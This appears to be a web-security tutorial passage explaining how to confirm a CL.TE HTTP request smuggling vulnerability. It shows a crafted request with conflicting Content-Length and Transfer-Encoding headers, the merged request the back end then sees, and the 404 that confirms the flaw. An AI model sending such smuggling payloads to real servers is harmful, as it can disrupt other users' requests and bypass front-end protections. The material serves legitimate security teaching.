Confirming CL.TE vulnerabilities using differential responses
To confirm a CL.TE vulnerability, you would send an attack request like this:

"
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
"

If the attack is successful, then the last two lines of this request are treated by the back-end 
server as belonging to the next request that is received. This will cause the subsequent "normal" 
request to look like this:

"
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
"

Since this request now contains an invalid URL, the server will respond with status code 404, 
indicating that the attack request did indeed interfere with it.
